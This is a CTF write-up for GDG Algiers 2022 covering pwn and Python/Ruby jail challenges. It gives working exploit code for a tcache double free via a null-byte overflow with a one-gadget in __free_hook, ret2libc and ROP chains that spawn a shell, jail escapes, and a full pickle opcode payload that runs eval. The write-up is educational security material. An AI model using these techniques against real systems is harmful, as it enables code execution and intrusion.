# GDG Algiers

This was an unofficial participation for my team & despite being a day behind, we ranked 14th out of more than 700 teams.

For this one, I focused on *Jail* & *PWN*. I solved 3 jails & 4 pwn challenges, 1 was after the end of the CTF.

I did enjoy 3 challenges in this CTF, which encouraged me to work on a detailed writeup for the solves. These challenges are:

* [Kevin Higgs: The Revenge (PyJail)](#jail3)
* [Notes keeper (Pwn)](#pwn2)
* [Faster python (Pwn)](#pwn4)

I would like to thank my team mate [t0m7r00z](https://github.com/t0m7r00z) for the huge help when dealing with the heap challenge (Notes Keeper).

 Hope you enjoy this & feel free to contact me for questions, fixes...

------------

- [Pwn](#pwn)
    -  [Counter | 250 Solves](#pwn1 "Writeup")
	-  [Notes keeper | 25 Solves](#pwn2 "Writeup")
    -  [Mind games | 19 Solves](#pwn3 "Writeup")
    -  [Faster Python | 10 Solves](#pwn4 "Writeup")

- [Jail](#jail)
    -  [Red Diamond | 315 Solves](#jail1 "Writeup")
	-  [Type it | 49 Solves](#jail2 "Writeup")
    -  [Kevin Higgs: The Revenge | 9 Solves](#jail3 "Writeup")

------------

### Pwn
1. <p name="pwn1"><b>Counter</b></p>

    Source: [Here](/2022/GDG%20Algiers/source/pwn/Counter/counter.c)<br />
    Solver: [Here](/2022/GDG%20Algiers/source/pwn/Counter/Counter.py)<br />

    This was pretty straightforward, we have a counter:

    ```c
    unsigned char counter = 1;
    ```

    And we can increment without limits & can decrement on condition it's not equal 1. We must set it 0 to get the flag. An unsigned char is stored as 1 byte, which means we can have values from 0 to 255. Reaching 256 would result in returning back to 0.

    Solution: Increment till we overflow `counter` to be set to 0.

<br />

2. <p name="pwn2"><b>Notes keeper</b></p>

    Binary: [Here](/2022/GDG%20Algiers/source/pwn/Notes%20keeper/chall)<br />
    Solver: [Here](/2022/GDG%20Algiers/source/pwn/Notes%20keeper/solve.py)<br />
    Libc: 2.29<br />
    Binary Security:

    <p align="center">
    <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/checksec.png"><br/>
    </p>

    * **Static Analysis**

        For this one, we were given a binary file with a libc file. We pass it to Ghidra for static analysis & we can find a menu with 4 options:

        - Add note
        - Remove note
        - Edit note
        - View note

        However, the edit option simply calls `puts("option 3");`. Digging deeper into the remaining options:

        * Add note: 
            - We can create at most 3 chunks.
            - The count of the current created chunks is stored in a global variable `created_entries`.
            - The chunks are stored in a global array called `entries`.
            - Maximum chunk size is 0x200.
            - We can write at most `size` bytes and we'll be able to insert a null byte at `size+1`, which gives us a possibility of null byte poisoning.


        <details>
            <summary>Decompiled code</summary>
            
        ```c
        if (created_entries < 3) {
            printf("Size: ");
            fgets(local_1a,8,stdin);
            size = atoi(local_1a);
            if ((size == 0) || (0x200 < size)) {
            puts("Invalid size");
            }
            else {
            __buf = malloc((ulong)size);
            if (__buf == (void *)0x0) {
                printf("Error occured while allocating memory");
            }
            else {
                printf("Note content: ");
                sVar1 = read(0,__buf,(ulong)size);
                *(undefined *)((long)__buf + (long)(int)sVar1 + 1) = 0;
                entries[(int)created_entries] = __buf;
                created_entries = created_entries + 1;
                puts("Note added");
            }
            }
        }
        else {
            puts("Maximum notes reached");
        }
        ```
        </details>

        <br />

        * Remove note: 
            - We can give the index of the chunk in `entries` array.
            - There is no range check for the index, giving the possibility to free arbitrary areas. However, this doesn't give us much control because we are able to write into the heap only & taking into consideration PIE protection, we'll require a PIE leak in order to make use of this. Also we cannot use negative indexes.(I would like to know if there is an other way)
            - We decrement `created_entries` without any value check.


        <details>
            <summary>Decompiled code</summary>

        ```c
        uint idx;
        idx = 0;
        printf("Note index: ");
        __isoc99_scanf(&DAT_00102067,&idx);
        free(entries[idx]);
        created_entries = created_entries + -1;
        puts("Note removed")
        ```
        </details>

        <br />

        * View note: 
            - We can give the index of the chunk in `entries` array.
            - There is no range check for the index. Also there is the possibility of giving a negative offset which gives us the possibility to leak values from GOT since the binary is using **Full Relro** protection (GOT is behind BSS). However, I didn't actually see this one & I figured out an other way to obtain a libc leak. Was harder but worth.
            - We get to see the address & it's content, which is usefull for heap leak.

        <details>
            <summary>Decompiled code</summary>

        ```c
        int idx;
        idx = 0;
        printf("Index: ");
        __isoc99_scanf(&DAT_00102067,&idx);
        if (idx < 4) {
        if (entries[idx] == (void *)0x0) {
            puts("This note has been deleted already");
        }
        else {
            printf("This note is located at: %p",entries[idx]);
            puts((char *)entries[idx]);
        }
        }
        else {
        puts("Invalid index");
        }
        ```
        </details>

        <br />

    * **Exploiting**

        So, as I mentioned above, I didn't actually notice the ability to get an easy libc leak so I had to figure something out. As a start, I had to figure out a way to get an arbitrary write. Considering the chunk count limit, we cannot fill tcache bin.

        For whoever is new to this, tcache bin consists of a maximum of 7 chunks saved as a linked list, with each chunk pointing to the next chunk.

        Each size have it's own bin, with upto 64 tcache bins. These are mainly used for optimization. Also tcache have a double free check in libc 2.29 which means we'll have to figure some other way around.

        A great resource for me was [this](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/) if you're interested in learning more about heap.

        Now, considering that we have an off by one with a null byte. We should be able to allocate 2 chunks, A & B of the same size (24 for this example). Our heap layout will be the following:

        <p align="center">
            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/heap2.png">
            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/heap1.png"><br/>
        </p>

        And `0x0000000000000021` is our chunk size which is 0x20 & the 0x1 is a flag that indicates if the previous chunk is in-use or no.

        If we look at the heap layout, we can notice that we'll be able to write a null byte at a chunk's size. And checking the decompiled code again, we see that we insert a null byte at `written bytes + 1` which means, if we write 24 bytes, we'll be adding a null byte in the 2nd byte of the size value (HeapAdr[25]). We can write 1 less byte in order to overwrite the first byte of the size OR we can use a size greater than 0x100 & overwrite the 2nd byte.

        Now, how can we abuse this? Remember when we talked about tcache, we said that bins contain chunks with the same size, so if we free a different size, it'll go to an other bin which avoids our double free check!

        Now, how do we do that?

        After allocating both A & B, we'll free B then A. When we use such an order, we'll have our A chunk at the end of our tcache linked list. tcache is a LIFO linked list (Last in, first out) which means when we allocate a 24 bytes chunk again, we'll have chunk A and that'll make us able to edit chunk B size to be able to free it again!

        With that, we'll get our double free!

        We can pick 0x188 as our initial size, that'll create a chunk of size 0x190. we free both B & A:

        ```mermaid
        graph TD;
        0x190: 
        ;B-->A
        ```

        We allocate A again & with it, we'll change B size to 0x100. This will keep chunk B in 0x190 tcache bin.

        ```mermaid
        graph TD;
        0x190: 
        ;B
        ```

        However, we can free B again & it'll add B to a new tcache bin:

        ```mermaid
        graph TD;
        0x190: 
        ;B
        ```
        ```mermaid
        graph TD;
        0x100: 
        ;B
        ```

        Now we can allocate B twice!

        If you're not familiar with heap, when a chunk is freed the first 16 bytes of the user data will be used as a backword/forward pointer to the next free chunk. If we can allocate B twice, it means we'll be able to change the backword/forward pointer of the 2nd allocation. Which means, we'll have an arbitrary write!

        Transforming that into code, we'll have the following:

        ```python
        size = 0x188

        newNote(size, "A") # index 0
        newNote(size, "B") # index 1

        delNote(1)
        delNote(0)

        newNote(size, "a"*(size-1)) # 0, Change size of chunk 1 to 0x100

        delNote(1) # Double free

        # Chunk size is 0x100, which means 0x100-0x10 are used for user data
        # The adr offset is const.
        newNote(0x100-0x10, p64(adr))
        newNote(size, "C") # Allocate B after corrupting it's pointer

        newNote(size, b"Data") # This is our controlled chunk.
        ```

        <br/>

        Now with an arbitrary write, we'll need a leak. Since the binary is using Full Relro, GOT overwrite isn't an option. So, we can make use of our malloc/free hooks. We are using libc 2.29 so they are still available.

        For the libc leak, we could've used a negative offset in the view option to read from GOT but I missed that so I had to get creative. 
        
        What I came up with: Since we have a heap leak in the view note option, we can allocate a chunk, find it's address & we make an arbitrary write to edit the size of it. If we write a big enough size, freeing the chunk will result in storing it in unsorted bins. With a Use After Free (UAF), we'll be able to leak the libc main arena address!

        After doing so, we'll be able to re-do the arbitrary write to write the address of a one gadget in malloc/free hook.

        Checking the libc, we find some one gadgets:

        <p align="center">
            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/one_gads.png"><br/>
        </p>

        We'll have to check the constraits to know if it'll be possible to use one of them. 
        
        We start with the remove note option (free):

        <p align="center">
            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/free.png"><br/>
        </p>

        The index we give is stored in `eax` register, then `rdx = rax * 8`, and it remains unchanged till the free call, which means we can control `rdx` value.

        Now, if we run the binary & set a breakpoint in instruction `remove_note+102`, which is the free call, we can see that `rcx` register is set to 0.

        <p align="center">
            <img src="/2022/GDG%20Algiers/img/Notes%20Keeper/gdb_bp.png"><br/>
        </p>

        That decides which one gadget to use! 

        ```
        0xe2383 execve("/bin/sh", rcx, rdx)
        constraints:
            [rcx] == NULL || rcx == NULL
            [rdx] == NULL || rdx == NULL
        ```

        Now, we go for the leak. If we simply code what I explained above:

        ```python
        size = 0x188
        MAX = 0x200-1
        
        newNote(size, "A") # 0
        newNote(size, "B") # 1
        
        adr, _ = viewNote(0) # heap leak
        
        delNote(1)
        delNote(0)
        
        newNote(size, "a"*(size-1)) # 0, overwrite size of chunk 1 to 0x100
        
        delNote(1) # Double free
        
        # Chunk size is 0x100, which means 0x100-0x10 are used for user data
        # The adr offset is const.
        newNote(0x100-0x10, p64(adr+0x70+0x120-8))
        newNote(size, "C") # Allocate B after corrupting it's pointer, we'll use this chunk to leak libc too (Index 1)
        
        newNote(size, p64(0x511)) # Controlled adr
        ```

        We'll face 2 problems:
        * created_entries == 3: We can bypass this by simply using remove note option with an out of range index. The value must be NULL to avoid any crashes! We can go for `delNote(3)`
        * If we free our chunk after changing it's size, we'll get a crash: `double free or corruption (!prev)`

        Going for the `free` source code, we can trace the error to this part:

        ```c
        /* Or whether the block is actually not marked used.  */
        if (__glibc_unlikely (!prev_inuse(nextchunk)))
        malloc_printerr ("double free or corruption (!prev)");
        ```

        Which means, the next chunk, which is located at the address of chunk C + 0x510, must have the prev in-use flag set.

        To reach that area of the memory, we'll need to allocate more chunks. We decrement `created_entries` value again, setting it back to 0, & we can keep allocating chunks, decrement, allocate... Till we reach that area of memory.

        However, when we reach that part & set the prev in-use flag, we'll have to specify a chunk size which will lead to a different error: `corrupted size vs. prev_size`.

        If we trace back the error, we'll find it coming from the `unlink_chunk` function:

        ```c
        static void
        unlink_chunk (mstate av, mchunkptr p)
        {
            if (chunksize (p) != prev_size (next_chunk (p)))
                malloc_printerr ("corrupted size vs. prev_size");
        ```

        Which gets called from this part of `free`:

        ```c
        if (nextchunk != av->top) {
            /* get and clear inuse bit */
            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

            /* consolidate forward */
            if (!nextinuse) {
                unlink_chunk (av, nextchunk);
                size += nextsize;
            } else
                clear_inuse_bit_at_offset(nextchunk, 0);
            
            ...
        ```

        What currently happens, it checks the next chunk if it's in-use or no. If it does, it'll simply call `clear_inuse_bit_at_offset` to mark the current chunk not in-use. Else it'll consolidate forward both chunks (Merge them).
        
        How does it check if it's in-use? It simply checks for the prev in-use flag in the chunk after it, which apparently lands on a null byte for now resulting in a forward consolidation.

        How to deal with that? We either fake an other chunk or we can simply use the pre-existing top chunk.

        Everything explained above gives the following:

        ```python
        # Decrease created_entries
        delNote(3)
        delNote(3)
        
        delNote(3)
        newNote(MAX, "A")
        
        delNote(3)
        newNote(MAX, b"A"*(0x168) + p64(0xa1)) # This will reach adr+0x510. Offset (0xa0) is the offset between adr+0x510 & the top chunk size.
        
        delNote(1)
        adr, leak = viewNote(1)
        libc = u64(leak.ljust(8, b'\0')) - 0x1e4ca0
        
        one_gad = 0xe2383 + libc
        free_hook = 0x1e75a8 + libc
        ```

        After leaking libc, we can write our one gadget in `__free_hook` & use remove note option with index 0 to run our one gadget.

    * **Conclusion**

        Despite taking a longer road, I did really enjoy this. I'm still new to heap related challenges so, doing it this way actually helped me a lot. I'll be looking forward for more heap challenges!


<br />

3. <p name="pwn3"><b>Mind games</b></p>
    
    Source: [Link](/2022/GDG%20Algiers/source/pwn/Mind%20games/mind-games.c)<br/>
    Solver: [Link](/2022/GDG%20Algiers/source/pwn/Mind%20games/solve.py)<br/>
    Libc: 2.31

    * **Static Analysis**

        As a start, it appears a typical PRNG challenge, using `srand(time(NULL));` for the seed.

    * **Exploiting**

        Writing a quick solver for this one, we simply use the given libc & use the same seed in order to get the same random number.

        ```python
        libc = CDLL("./lib/libc.so.6")
        r = conn()
        
        libc.srand(libc.time(0))

        s = libc.rand()
        rand = str(s).encode()

        r.sendline(rand)
        ```

        However, we get a troll message stored in the `flag.txt`... Mind games I see...

        Going through the code again, we notice that we are using "%s" for `scanf` which is vulnerable for Buffer Overflow. Also, we are able to execute a return only if our answer is correct, else `exit` will be called.

        Well, it's what it's! Let's ret2libc.

        A typical ret2libc, nothing is fancy about it. We should only avoid using the byte `0x20` because it stands for a space & `scanf` stops at it.

        So, plan is:
        1. We leak libc.
        2. Call main again.
        3. Ret to a one gadget or `system('/bin/sh')`

        And we should get our shell:

        <p align="center">
            <img src="/2022/GDG%20Algiers/img/Mind%20Games/shell.png"><br/>
        </p>

<br />

4. <p name="pwn4"><b>Faster Python</b></p>

    This one was a bit special, we were given a python 3.10 binary with a lib `cext.cpython`. We were also given a `main.py` script.

    Python binary: [Link](/2022/GDG%20Algiers/source/pwn/Faster%20Python/challenge/python3.10)<br/>
    Lib: [Link](/2022/GDG%20Algiers/source/pwn/Faster%20Python/challenge/cext.cpython-310-x86_64-linux-gnu.so)<br/>
    Main Script: [Link](/2022/GDG%20Algiers/source/pwn/Faster%20Python/challenge/main.py)<br/>
    Security:
    <p align="center">
        <img src="/2022/GDG%20Algiers/img/Faster%20Python/checksec.png"><br/>
    </p>

    * **Static Analysis**

        We start with the `main.py`. We see that we are importing a `cext` which I assume is a custom one & the given library file is the module itself.

        ```python
        import cext as module

        class CBytes:
            def __init__(self, size):
                b = module.input(size)
                self.b = b

            def __len__(self):
                return module.len(self.b)

            def print(self):
                return module.print(self.b)
        
        ...

        if __name__ == "__main__":
            size = getsize()
            cb = CBytes(size)
        ```

        So when an instance of `CBytes` class is created, we'll call `input` function, located in the module. Examining the `getsize`:

        ```python
        def getsize(maxsize=MAXSIZE):
            size = int(input("Enter size: "))
            assert(size < maxsize)
            return size
        ```

        We see there is a `MAXSIZE` limit however, there is the possibility to use a negative or a null size.

        We also get the ability to call a `print` function from our custom module. We can also change our size & call `input` again.

        Enough from the script, we head to the library! We pass the lib file to Ghidra & dive into the functions. I focused mainly on the `input` function:

        <details>
            <summary>Decompiled (Trimmed)</summary>

        ```c
        undefined8 cext_input(undefined8 param_1,undefined8 param_2)
        {
            ...
            tmp = _PyArg_ParseTuple_SizeT(0,param_2,&DAT_00102002,&size);
            if (tmp == 0) {
                ret = 0;
            }
            else {
                size2 = (ulong)size;
                if (tmp_char == L'y') {
                i = 0;
                }
                else {
                do {
                    i = 0;
                    __printf_chk(1,"Enter bytes: ");
                    if (size2 != 0) {
                        do {
                            sVar1 = read(0,&tmp_char,1);
                            if (sVar1 == -1) goto LAB_00101411;
                            if (sVar1 == 0) break;
                            res[i] = (char)tmp_char;
                            i = i + 1;
                        } while (size2 != i);
                    }
        ```

        </details>

        I would suppose that `_PyArg_ParseTuple_SizeT` simply initializes the `size` variable using `param_2`. Considering that we can use negative sizes, the following convertion might overflow:

        ```c
        size2 = (ulong)size;
        ```

        I had to hurry a little so I didn't go deeper for this one.
        <br/>
    
    * **Exploiting**

        First thing first, I tried out the negative size & it worked. What makes it better, our input is reflected to us:

        ```c
        __printf_chk(1,"Entered bytes: %s\n",res);
        ```

        Which gives us a great opportunity for leaks. Now, what size do we use? Well, I had to bruteforce that to gain time but I'm pretty sure it can be calculated since it's a simple overflow problem.

        At first, I had to find a perfect size to be able to leak the canary. After a while debuging with GDB, checking stack... I managed to get my leak.
        
        After that, I looked for a PIE leak. This one was a pretty hard to get a leak & avoid a crash. After reaching the canary, I had to overwrite the saved `rbp` value in order to leak a binary address. Doing so, resulted in a crash after returning.

        I had basically 2 choices:
        1. Leak PIE, re-send input & ROP Chain
        2. Leak the saved `rbp`, which means more steps to do...

        At this point, I decided go for the quick ROP chain, however, the address I was leaking was located `32 bytes` after the saved return address. I could've looked for an other leak more further to get a better ROP chain but that would mean finding an other size & going through the stack values again... Let it be 32 bytes!

        What possible ROP chain can give me a control over the execution with only 4 gadgets? First thing I did was checking the registers' values when returning to check if there is anything useful:

        <p align="center">
            <img src="/2022/GDG%20Algiers/img/Faster%20Python/reg.png"><br/>
        </p>

        The `rsi` register contains the address of our input in the stack, the `rdi` isn't a stack address. We can make use of the `rsi` register if we make a `read` call since it'll be set to a close address to our ROP chain, however we'll have to zero the `rdi` register & put a good enough value in `rdx` for the `read` call.

        Or, we could look for a way to pivot our stack to `rsi` or `rdi`.

        I looked for a gadget to pivot but couldn't find anything so I went for the other plan, calling `read`. After a while of searching & going through the gadgets, I found a `pop rdi; pop rdx; ret` gadget. We can use 4 gadgets, that's 32 bytes, If we use this gadget, we'll use 16 bytes for the pop & it'll take the first 8 bytes. This leaves us with 8 bytes, enough to put a `read` address! A perfect fit!

        After that, we'll be able to do a ROP chain without limits. We look into the binary (python) for more gadgets. We can find a `syscall` gadget but it doesn't have a `ret` therefore, this might be used only at the end of our ROP chain. And we can find pretty much everything else we need to control registers so that should be it; We call `read` to write a "/bin/sh" into a known memory region & then use `syscall` to execute `execve` & pop our shell!
        
<br />

### Jail
1. <p name="jail1"><b>Red Diamond</b></p>

    This one was pretty straightforward, a ruby jail. We can execute any code we want so... `system "/bin/sh"` will pop our shell.

<br />

2. <p name="jail2"><b>Type it</b></p>

    Source: [Link](/2022/GDG%20Algiers/source/jail/Type%20It/chal.py)<br/>
    Solution: `flag.split())(flag)#`

    This was a python jail, We were given the source code. We mainly create a string using format then we `eval` it. The string is in the form: `type(S)` where S is our input.

    Not only that, we only had the flag in `flag` variable & only `type` function is conserved. Also we had a black list:

    ```python
    BLACKLIST = '"%&\',-/_:;@\\`{|}~*<=>[] \t\n\r'
    ```

    For this one, we can simply abuse the fact that we can comment out the last `)` & use the returned class from `type` to create a string that's initialized with the flag variable. It can be done for the list type too, which was what I've done first.

    Our payload will be interpreted as `type(flag.split())(flag)`, which will simply return a list initialized with the flag.

<br />

3. <p name="jail3"><b>Kevin Higgs: The Revenge</b></p>

    This one was one of my favorite challenges, we don't see much of this kind of challenges around. The goal of this challenge was to write an exploit with Pickle Opcode that respects a certain conditions.

    Source: [Link](/2022/GDG%20Algiers/source/jail/Kevin%20Higgs%3A%20The%20Revenge/challenge/challenge.py)<br/>
    Solve: [Link](/2022/GDG%20Algiers/source/jail/Kevin%20Higgs%3A%20The%20Revenge/challenge/solve.py)

    This challenge is about writing a proper pickle OpCode to get a shell/get the content of "flag.txt".

    As a start, what's pickle & what's an OpCode?

    Pickle is a python module that helps in serializing python objects to be able to send the object across the network as a sequence of bytes or to be able to write an object into a file to save it.

    What's the opcode? When you serialize an object, you serialize the functions defined in it too, which means, that code have to be saved somehow... That's what an opcode is for, it's like an assembly.

    Alright, now, our challenge is a revenge version of [this challenge](https://ctftime.org/writeup/33666).

    Checking the code:
    * Payload length: 400
    * We can access attributes of only `empty`
    * We have a maximum depth of 2 (Example: empty.x.y)

    Reading the writeup above, we should execute this:

    `empty.__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('print(open("flag.txt").read())')`

    But we'll have to do that one step at a time due to the depth limit. We'll simply add more attributes to `empty` class to be able to solve that, like the following:

    ```python
    empty.x = empty.__class__.__base__
    empty.y = empty.x.__subclasses__()[100]
    empty.z = empty.y.__init__
    ...
    ```

    The difference here is, we cannot use the `__setattr__` function because it's blacklisted. We'll have to figure an equivalent method.

    There is also an opcode blacklist, we'll talk about that later on but it didn't matter a lot.

    Now, how can we replace `__setattr__`? There are 2 ways for this, the intended solution was using `empty.__init__` function. The other way, which I used, was by using the `empty.__dict__.update` function.

    If we examine the `__dict__` object, if we add a key to it we'll be able to add an attribute to our class.

    <p align="center">
        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict.png"><br/>
    </p>

    Now, if we look up the functions we have in the `dict` object using `help`, we can find the `update` function:

    <p align="center">
        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/update.png"><br/>
    </p>

    And it takes a **dict/iterable** and updates the dictionary from it. This looked like the best hope I had at that moment so I gave it a try.

    Now, it's time to talk about opcodes. The execution makes use of 2 things:
    * Stack: We can push & pop. Last in first out.
    * Memo: Similar to an array, store/get elements by index.

    And we have OpCode instructions that uses the stack values.

    I had to go through everything to figure out what we had, if you're interested in reading more, you can check the [documentation](https://docs.juliahub.com/Pickle/LAUNc/0.3.2/opcode/#OpCodes).

    I also used this code to print out the allowed opcodes:

    ```python
    import prettytable
    import pickletools

    BLACKLIST_OPCODES = {
        "BUILD",
        "SETITEM",
        "SETITEMS",
        "DICT",
        "EMPTY_DICT",
        "INST",
        "OBJ",
        "NEWOBJ",
        "EXT1",
        "EXT2",
        "EXT4",
        "EMPTY_SET",
        "ADDITEMS",
        "FROZENSET",
        "NEWOBJ_EX",
        "FRAME",
        "BYTEARRAY8",
        "NEXT_BUFFER",
        "READONLY_BUFFER",
    }

    opcode_table = prettytable.PrettyTable()
    opcode_table.field_names = ['Name', 'Code', 'Docs']
    for opcode in pickletools.opcodes:
        if opcode.name not in BLACKLIST_OPCODES:
            opcode_table.add_row([opcode.name, hex(ord(opcode.code)), opcode.doc.splitlines()[0]])
        
    print(opcode_table)
    ```

    Reference: [Writeup](https://ctftime.org/writeup/29142)
    
    I'll go through the OpCodes that we'll use for now:

    * **UNICODE** (0x56): Used to push a unicode string object to the stack.
        Example: `Vempty` will push "empty" to the stack.

    * **STACK_GLOBAL** (0x93) or **GLOBAL** (0x63): This takes 2 strings from the stack (\n is a seperator). Then calls `find_class` for us, which will resolve the string we pushed. The result will be pushed to stack.
        Example: `Vempty\nV__class__.__base__\n\x93` will function the following way:
        ```
        Stack.push("empty")
        Stack.push("__class__.__base__")

        # STACK_GLOBAL opcode:
        arg2 = Stack.pop()
        arg1 = Stack.pop()
        result = find_class(arg1, arg2)
        Stack.push(result)
        ```
    
    * **MARK** (0x28): Used to mark the begining of tuples, dicts, lists... while creating them.

    * **TUPLE** (0x74): Creates a tuple, starting from the top of the stack, till it reaches a **MARK** object. Example:
        ```
        Stack:
            a (TOP OF STACK)
            b
            c
            MARK
            d
        
        After TUPLE OpCode

        Stack:
            (c, b, a) (TOP OF STACK)
            d
        ```
    
    * **REDUCE** (0x52): Takes a tuple from the stack & a callable object (A function) & uses the tuple as arguments for the function call. We'll use this to call the `update` function. Example:
        ```
        Stack:
            function_object
            (a, b, c)
        
        args = Stack.pop()
        func = Stack.pop()
        Stack.push(func(*args))
        ```
    
    * **PUT** (0x70): We give it an index & it'll store the top of the stack into the memo in that index.

    * **GET** (0x67): We give it an index & it'll push the stored value from the memo in that index to the stack.

    * **DUP** (0x32): Takes the value in the top of the stack & pushs it again to duplicate it.
    
    Now, how are we going to call `update`? If we look closely at the `BLACKLIST_OPCODES`, we'll find `DICT` opcode blacklisted which means we cannot create a `dict` in stack, what if we try passing a pair of `(KEY, VALUE)` ?

    <p align="center">
        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict2.png"><br/>
    </p>

    We see that it asks for the element #0 to have a length of 2? One might think, We are already passing a tuple of length 2? What's going on? BUT, what if it's checking the element #0 of that tuple? If we try to make it of size 2: `(('K', 1), 2)`

    <p align="center">
        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict3.png"><br/>
    </p>

    We can see that we've added a new key! Also we are getting the same error for the element #1 now. So if we use the following: `(('K', 1), ('K',2))`<br/>
    We'll add a new key 'K' & the value will be set to 2.

    <p align="center">
        <img src="/2022/GDG%20Algiers/img/Kevin%20Higgs:%20The%20Revenge/dict4.png"><br/>
    </p>

    We can use this to add 2 keys at once too.

    Now, how can we call `update` with opcodes? The tuples are a mess true but we can do it slowly:

    ```
    MARK
    Stack.push("k")
    Stack.push(2)

    Stack:
        2
        k
        MARK
    ```

    Now, if we add a TUPLE Opcode, we'll create a tuple in the stack:

    ```
    MARK
    Stack.push("k")
    Stack.push(2)
    TUPLE

    Stack:
        (k, 2)
    ```

    Now, if we add an other **MARK** before everything, and duplicate our tuple, we'll have the following:

    ```
    MARK

    MARK
    Stack.push("k")
    Stack.push(2)
    TUPLE

    DUP

    Stack:
        (k, 2)
        (k, 2)
        MARK
    ```

    We add a **TUPLE** to wrap everything:

    ```
    MARK

    MARK
    Stack.push("k")
    Stack.push(2)
    TUPLE

    DUP
    TUPLE

    Stack:
        ((k, 2), (k, 2))
    ```

    Now, this is the first argument to `update`, if we go back to **REDUCE**, we see that all of the arguments must be wrapped in a tuple, so we add a **MARK** at the begining & wrap everything with a tuple:

    ```
    MARK

    MARK

    MARK
    Stack.push("k")
    Stack.push(2)
    TUPLE

    DUP
    TUPLE

    TUPLE

    Stack:
        ( ((k, 2), (k, 2)) )
    ```

    And now, we are ready to call `update`, we only have to push the callable object (Not the string) `update`.

    ```
    Stack.push(update)

    MARK
    MARK
    MARK
    Stack.push("k")
    Stack.push(2)
    TUPLE
    DUP
    TUPLE
    TUPLE

    REDUCE
    ```

    And that'll execute `update( ((k, 2), (k, 2)) )` !

    Now, how do we get the `update` object? We can use the **STACK_GLOBAL** opcode to resolve `"__dict__.update"` for us.

    ```
    Stack.push("empty")
    Stack.push("__dict__.update")

    STACK_GLOBAL

    Stack:
        update (callable object)
    ```

    Now, we can use the memo to make our payload shorter by saving the "empty" string. Also we'll store our `update` in it to make access easier.

    Our final payload will be:

    ```python
    lepickle = b'\x80\x04' \
           b'Vempty\np6\n' \
           b'g6\nV__class__.__base__\n\x93p0\n' \
           b'(g6\nV__dict__.update\n\x93p1\n' \
           b'g1\n(((Vobj\ng0\nt\x32ttR' \
           b'g6\nVobj.__getattribute__\n\x93p2\n' \
           b'g1\n(((Vsc\ng6\nVobj.__subclasses__\n\x93)Rt\x32ttR' \
           b'g6\nVsc.__getitem__\n\x93p3\n' \
           b'g1\n(((Vi\ng2\n(g3\n(I100\ntRV__init__\ntRt\x32ttR' \
           b'g1\n(((Vgl\ng6\nVi.__globals__\n\x93t\x32ttR' \
           b'g6\nVgl.__getitem__\n\x93p4\n' \
           b'g1\n(((Vb\ng4\n(V__builtins__\ntRt\x32ttR' \
           b'g6\nVb.__getitem__\n\x93p5\n' \
           b'g1\n(((Ve\ng5\n(Veval\ntRt\x32ttR' \
           b'g6\nVe\n\x93(Vprint(open("flag.txt").read())\ntR.'
    ```

    I re-used the payload in this [writeup](https://ctftime.org/writeup/33666) & I edited the code to make it faster.

    Too scary huh? Just look at each line on it's own:

    * `'\x80\x04'`: Pickle protocol version
    * `b'Vempty\np6\n'`: `Vempty\n` Push "empty". `p6\n` stores the top of the stack in memo[6].
    * `'g6\nV__class__.__base__\n\x93p0\n'`: `g6\n` Push memo[6] in stack. `V__class__.__base__\n` push "\_\_class__.\_\_base__" in stack. `\x93` is **STACK_GLOBAL**. `p0\n` stores top of stack (result of `find_class`) in memo[0].

    And so on...

    That was all! This was fun, nice one!

------------

WIP